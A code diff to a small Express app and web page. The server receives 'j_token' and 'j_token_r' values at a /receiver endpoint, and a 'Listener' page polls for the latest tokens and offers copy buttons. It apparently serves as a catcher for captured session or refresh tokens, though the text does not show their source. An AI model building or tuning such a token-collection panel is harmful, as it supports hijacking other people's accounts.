@@ -56,7 +56,6 @@ body {
     padding: 4px 8px;
     cursor: pointer;
 }
-
 </style>
 
 </head>
@@ -80,37 +79,31 @@ body {
 
 console.log("Listener started...");
 
-let lastData = {};
-
 async function checkData() {
     try {
         const res = await fetch("/latest");
         const data = await res.json();
 
-        if (data && (data.j_token || data.j_token_r)) {
-
-            console.log("NEW DATA:", data);
-
-            document.getElementById("t1").innerText =
-                data.j_token || "No data yet";
-
-            document.getElementById("t2").innerText =
-                data.j_token_r || "No data yet";
-
-            lastData = data;
+        if (!data || (!data.j_token && !data.j_token_r)) {
+            return;
         }
+
+        console.log("NEW DATA:", data);
+
+        document.getElementById("t1").innerText =
+            data.j_token || "No data yet";
+
+        document.getElementById("t2").innerText =
+            data.j_token_r || "No data yet";
 
     } catch (e) {}
 }
 
-setInterval(checkData, 5000);
-
+setInterval(checkData, 2000);
 
 function copy(id) {
     const el = document.getElementById(id);
-    const text = el.innerText;
-
-    navigator.clipboard.writeText(text);
+    navigator.clipboard.writeText(el.innerText);
 }
 
 </script>
@@ -125,6 +118,7 @@ function copy(id) {
 let lastData = null;
 
 
+// POST
 app.post("/receiver", (req, res) => {
 
     const data = req.body.message || {};
@@ -140,8 +134,12 @@ app.post("/receiver", (req, res) => {
 
 
 app.get("/latest", (req, res) => {
+
+    const data = lastData;
+
     lastData = null;
-    res.json(lastData || {});
+
+    res.json(data || {});
 });
 
 
